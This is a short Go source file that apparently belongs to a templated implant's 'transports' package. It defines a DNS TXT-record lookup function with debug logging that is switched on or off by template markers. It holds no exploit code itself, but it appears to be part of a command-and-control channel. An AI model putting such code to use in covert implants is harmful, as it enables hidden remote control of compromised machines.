package transports

import (
	"context"
	"log"
	"net"
	"strings"
	"time"
)

func dnsLookup(domain string) (string, error) {

	udpResolver := net.Resolver{
		PreferGo: true,
	}

	// {{if .Debug}}
	log.Printf("[dns] lookup -> %s", domain)
	// {{end}}
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	txts, err := udpResolver.LookupTXT(ctx, domain)
	if err != nil || len(txts) == 0 {
		// {{if .Debug}}
		log.Printf("[!] failure -> %s", domain)
		// {{end}}
		return "", err
	}
	return strings.Join(txts, ""), nil

}
